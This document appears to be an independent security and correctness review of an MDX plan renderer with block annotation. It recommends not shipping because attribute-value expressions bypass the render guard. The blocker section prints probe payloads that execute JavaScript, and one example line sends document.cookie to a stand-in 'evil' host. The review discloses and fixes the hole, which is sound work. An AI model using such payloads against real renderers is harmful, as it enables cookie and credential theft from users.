---
manager_sessions:
  - id: 9aff9595-99c9-4fc4-8037-b7d0651e2f93
    role: review
    authored_at: 2026-07-01T05:46:26.018Z
---

# MDX Plan — Independent Review

Independent, skeptical review of the first-party MDX plan support (runtime MDX
renderer + ported block vocabulary + plannotator-style annotation + injection
contract). Reviewer built none of this; code was read fresh against the binding
decisions (`docs/mdx-plannotator-decisions.md` D1–D7) and the extracted spec
(`docs/mdx-spike-findings.md`).

All non-obvious findings below are **backed by executable probes** run against the
real modules (throwaway tests, removed afterwards) — not by inspection alone.

## Gate results (run independently)

- `vp check` → **0 errors**, 15 warnings, all pre-existing patterns elsewhere
  (`no-array-index-key`, `no-unstable-nested-components` in `ChatMarkdown`,
  mobile). **None in the mdx-plan code.**
- `vp run typecheck` → **0 errors** (2 unrelated `effect(...)` _suggestions_ in
  `apps/desktop`).
- Feature tests (`src/components/files/mdx-plan/`) → **17/17 pass**.

Gates are green. The findings below are correctness/security issues the gates
cannot catch.

---

## BLOCKER

### B1 — The security model does not hold: attribute-value expressions execute arbitrary JS

**Files:** `apps/web/src/components/files/mdx-plan/MdxPlanRenderer.tsx:32-47`
(`remarkRejectCodeEscapes`, `DISALLOWED_MDX_NODES`).

The stated guarantee (D2 / spike Verdict 1) is that the remark guard + closed
registry make _"the only executable surface the finite block set we author."_
**This is false.** The guard walks only `node.children` and rejects
`mdxjsEsm` / `mdxFlowExpression` / `mdxTextExpression`. MDX **attribute-value
expressions** (`mdxJsxAttributeValueExpression`, e.g. `code={…}`) live in
`node.attributes`, are never visited by the walker, and are compiled straight to
executable JS by `evaluate()`. Any expression — not just the JSON literals the
wire format needs — runs at render time in the module (global) scope.

**Demonstrated** (probe, both rendered without throwing):

```
<Code language="ts" code={((globalThis.__pwned = true), "x")} />   → PWNED: true
<Code language="ts" code={(function(){ globalThis.__pwned2 = true; return "y" })()} />  → PWNED2: true
```

So `code={fetch('https://evil/'+document.cookie)}` executes in the user's
browser with full DOM / network / credential access. The existing test suite
never probes this — `mdxPlan.test.ts` only rejects a _body_ expression
(`value: {globalThis.location}`), and its "good" fixture actually _relies_ on an
attribute expression (`code={"…"}`) rendering, which is the same door.

Severity is Blocker, not merely theoretical, because the render path is reachable
by **any `.mdx` file opened in the preview panel** — `isMdxPreviewFile` is
`/\.mdx$/i` (`filePreviewMode.ts:4`), so a `.mdx` from a cloned repo, a PR, a
dependency, or a prompt-injected agent turn is enough. Accepting `unsafe-eval`
(D2 Option A) was justified _by_ this guard bounding the eval surface; with the
guard porous, that rationale collapses.

**Fix options (either closes it):**

- Extend the guard to visit attribute-value expressions and reject any that are
  not static literals. The literal-only estree walker **already exists** in
  `mdxAttrs.ts` (`literalNodeValue`) — it is currently used only on the _parse_
  path (`fromAttrs`), not the _render_ path. Reusing it in the remark plugin makes
  the documented guarantee true while preserving the `entities={[…]}` JSON wire
  format.
- Or adopt D2 Option B (server-side `compile()` + `blob:` module) — heavier, only
  warranted if a strict CSP lands.

Do not ship on Option A until the guard rejects non-literal attribute expressions,
**or** the decision is explicitly re-ratified by the user with the words "plan MDX
can run arbitrary JS in the browser" on the table.

---

## SHOULD-FIX

### S1 — Whole-block anchoring collides for every block without an authored `id`

**Files:** `registry.tsx:64` (`blockId = … : ""`), each block emitting
`data-plan-block-id={blockId}` (e.g. `blocks/code.tsx:76`),
`MdxPlanRenderer.tsx:104-113` (`assignBlockIds`),
`annotation/anchoring.ts:143,171` (`targetSelector: [data-plan-block-id="${id}"]`).

Custom blocks **always** render `data-plan-block-id`, using `""` when the author
omitted `id`. The renderer's fallback (`assignBlockIds` → `plan-block-N`) is
designed to fill missing ids, but it skips any element that `hasAttribute(
"data-plan-block-id")` — which these always do. So every un-`id`'d block keeps
`data-plan-block-id=""`.

**Demonstrated** (probe): a whole-block anchor on the _second_ un-id'd block
serialises `targetSelector: [data-plan-block-id=""]`; `resolveAnchor` →
`root.querySelector('[data-plan-block-id=""]')` returns the **first** match. Two+
un-id'd blocks ⇒ every whole-block ("visual") comment attaches to the wrong
block.

This defeats the headline promise ("annotate the right block") for the common
case (authors rarely hand-write `id`). It hits the per-block comment affordance
and any text selection inside a non-prose block (both take the `visual` path).

**Fix (pick one):** don't emit the attribute when `blockId === ""` (let
`assignBlockIds` fill it); or make `assignBlockIds` also fill empty values; or
assign a unique id in `makeBlockComponent`. Prefer the first — it restores the
single intended id source.

### S2 — `targetSelector` interpolates the id unescaped; `resolveAnchor` has no guard

**Files:** `anchoring.ts:143,171` (selector build), `anchoring.ts:181-188`
(`querySelector`), `MdxPlanAnnotationLayer.tsx:126-149` (`recompute`).

`[data-plan-block-id="${block.id}"]` is built by string concatenation. An
authored `id` containing `"`, `]`, or a backslash yields a malformed selector;
`querySelector` **throws**, and `recompute` maps over comments with no
`try/catch`, so one bad anchor throws during the annotation layer's render.
Low likelihood (ids are usually simple) but unguarded. Use `CSS.escape(id)` (or
attribute-match on a sanitised id), and/or wrap per-comment resolution so one bad
anchor degrades to "detached" instead of taking down the layer.

---

## NICE-TO-HAVE

### N1 — `ambiguous` is never populated, so the agent is never warned

`anchorFromRange` (`anchoring.ts:120-159`) never sets `anchor.ambiguous`, even
when the quote occurs multiple times in the flattened text. The agent-facing
detail block (`planCommentAnchor.ts:64-66`) _renders_ an "Ambiguous: this quote
may match more than one place" line — but it is dead because the flag is never
true. Duplicate-quote disambiguation happens at resolve time via context scoring
(which works — tested), but the injected prompt never tells the model the anchor
was ambiguous. Cheap to set at capture time (the hit count is one `indexOf` loop).

### N2 — Boundary selections can capture the wrong quote

`anchorFromRange`'s `offsetOf` (`anchoring.ts:132-135`) returns `0` when
`range.startContainer` is an element rather than a text node (`spans.find(...)`
misses). A selection that begins at an element boundary then yields
`textQuote = text.slice(0, end)` — from document start. Re-resolution still finds
the quote substring, but the captured quote + context are wrong, so
disambiguation degrades. Uncommon (most selections start inside text nodes) but
worth a boundary-normalisation.

### N3 — `api-endpoint` absent from `NON_PROSE_BLOCK_TYPES` — confirmed acceptable

The pre-flagged item (`anchoring.ts:26-34`). `<Endpoint>` has a genuine prose
description (`childrenField: "description"`), so text-quote anchoring over its
prose (path, summary, param notes) is the _desirable_ behaviour, and whole-block
anchoring is still available via the per-block affordance. **No change needed** —
leave it prose. (Note: its whole-block path is still subject to S1.)

### N4 — `assignBlockIds` effect has no dependency array

`MdxPlanRenderer.tsx:157-159` runs on every render. Idempotent (guarded by
`hasAttribute`) so harmless, but it fires on unrelated re-renders. Minor.

---

## What is genuinely good (verified, not assumed)

- **Injection round-trip is lossless.** `formatReviewCommentContext` →
  `parseReviewCommentMessageSegments` deep-equals the original anchor (probe:
  including `mentions`, `ambiguous`, numeric `x/y`; key-order differs only because
  effect/Schema decode reorders keys — data is identical). Nested code fences in
  the quoted passage survive (the outer fence auto-grows past inner backtick runs).
- **No regression to line/diff review.** The `line` variant emits no `kind`
  attribute; the parser treats "no `kind`" as line and falls through unchanged.
  `restoreDiffReviewCommentRange` / `buildReviewCommentRenderablePatch` correctly
  narrow on `kind !== "line"`.
- **Discriminated union, done right (D6).** `kind: "line" | "mdx-anchor"` in both
  the effect schema and TS; no dual-shape coexisting-optionals, no
  "for backward compatibility" cruft anywhere in the diff.
- **Anchor model is genuinely extensible (D4).** Resolver dispatches on
  `anchorKind`; `targetKind` enum + reserved visual/canvas fields mean Phase 4
  (wireframe/canvas) adds kinds without rewriting the text path.
- **Minimal surface.** The slim `PlanBlock` contract correctly drops BuilderIO's
  `BlockSpec` editor machinery; blocks reuse the app's Shiki; no `@agent-native/core`
  dependency. Australian-English prose/UI copy is clean (the only "behavior/color"
  hits are CSS/DOM identifiers).
- **Byte-stable MDX round-trip works** across all 8 blocks (17/17 tests), which is
  the real corruption risk for authored plans.

---

## Verdict: **DON'T SHIP** (yet)

Two things must change first:

1. **B1 (Blocker)** — close the attribute-expression execution hole (reuse
   `literalNodeValue` in the remark guard to reject non-literal attribute
   expressions), **or** get the user to explicitly re-ratify D2 Option A knowing
   plan `.mdx` can execute arbitrary browser JS. The current decision rationale
   depends on a guarantee the code does not provide.
2. **S1 (Should-fix)** — fix the empty-`data-plan-block-id` collision so
   whole-block annotations attach to the right block; without it the core
   annotation promise silently fails for the common (no authored `id`) case.

**S2** is a small, worthwhile guard to land alongside S1. Everything else is
nice-to-have. The feature's happy path (annotate prose → context-disambiguated
anchor → lossless injection → agent revises the right passage) is real and works;
the blockers are the eval boundary and the non-prose/whole-block id collision.
